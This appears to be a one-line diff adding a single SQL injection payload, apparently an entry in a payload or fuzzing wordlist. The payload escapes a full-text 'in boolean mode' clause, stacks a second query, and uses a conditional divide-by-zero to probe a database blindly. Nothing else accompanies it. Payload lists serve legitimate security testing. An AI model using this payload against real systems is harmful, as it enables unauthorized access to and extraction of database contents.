@@ -1,0 +1,1 @@
+1' in boolean mode);select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--
